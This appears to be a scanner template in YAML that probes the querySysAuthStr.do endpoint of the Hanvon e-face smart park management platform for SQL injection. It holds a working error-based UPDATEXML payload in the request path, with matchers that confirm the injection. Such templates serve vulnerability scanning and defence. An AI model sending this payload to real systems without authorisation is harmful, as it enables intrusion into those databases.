id: poc-yaml-hw-e-face-pass-spmp-querysysauthstr-do-sqli
info:
  name: 汉王e脸通智慧园区管理平台 querySysAuthStr.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  description: |
    Detected a SQL Injection vulnerability in the querySysAuthStr.do endpoint of 汉王e脸通智慧园区管理平台, utilizing a crafted payload.

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: GET
    path:
      - "/manage/sysAuthStr/querySysAuthStr.do?columnKey=(UPDATEXML(2920,CONCAT(0x7e,md5({{t1}}),0x7e,(SELECT/**/(ELT(2920=2920,1)))),8357))&id=1&order=desc&page=1&pageSize=10&pointName=1&recoToken=SGUsqvF7cVS"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "success"
          - "hanvon"
          - "XPATH syntax error"
          - "java.sql.SQLException"
      - type: regex
        regex:
          - "{{t2}}"
        part: body
